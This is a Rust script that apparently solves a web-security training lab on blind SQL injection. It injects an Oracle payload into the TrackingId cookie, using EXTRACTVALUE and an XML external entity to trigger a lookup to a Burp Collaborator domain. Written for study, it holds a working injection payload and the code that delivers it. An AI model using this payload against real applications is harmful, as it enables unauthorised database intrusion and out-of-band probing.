/***************************************************************************************
*
* Author: Ahmed Elqalaawy (@elqal3awii)
*
* Date: 27/9/2023
*
* Lab: Blind SQL injection with out-of-band interaction
*
* Steps: 1. Inject payload into 'TrackingId' cookie to make a DNS lookup
*           to your burp collaborator domain
*        2. Check your collaborator for incoming traffic
*
****************************************************************************************/
#![allow(unused)]
/***********
* Imports
***********/
use reqwest::{
    blocking::{Client, ClientBuilder, Response},
    header::HeaderMap,
    redirect::Policy,
};
use std::{
    collections::HashMap,
    io::{self, Write},
    time::Duration,
};
use text_colorizer::Colorize;

/******************
* Main Function
*******************/
fn main() {
    // change this to your lab URL
    let url = "https://0aeb009904a80679806a44fe004700dc.web-security-academy.net";

    // change this to your collaborator domain
    let collaborator = "rlgst153v98gp4qym1jvzmq03r9jxbl0.oastify.com";

    // build the client that will be used for all subsequent requests
    let client = build_client();

    println!(
        "{} {}",
        "[#] Injection point:".blue(),
        "TrackingId".yellow(),
    );

    // payload to make a DNS lookup
    let payload = format!("'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [ <!ENTITY %25 remote SYSTEM \"http://{collaborator}/\"> %25remote%3b]>'),'/l') FROM dual)-- -");

    print!(
        "{}",
        "[*] Injecting payload to make a DNS lookup.. ".white(),
    );
    io::stdout().flush();

    // fetch the page with the injected payload
    client
        .get(format!("{url}/filter?category=Pets"))
        .header("Cookie", format!("TrackingId={payload}"))
        .send()
        .expect(&format!(
            "{}",
            "[!] Failed to make a DNS lookup with the injected payload".red()
        ));

    println!("{}", "OK".green());
    println!(
        "{}",
        "🗹 Check the DNS lookup in your burp collaborator".white(),
    );
    println!(
        "{} {}",
        "🗹 Check your browser, it should be marked now as"
            .white()
            .bold(),
        "solved".green().bold()
    )
}

/*******************************************************************
* Function used to build the client
* Return a client that will be used in all subsequent requests
********************************************************************/
fn build_client() -> Client {
    ClientBuilder::new()
        .redirect(Policy::none())
        .connect_timeout(Duration::from_secs(5))
        .build()
        .unwrap()
}
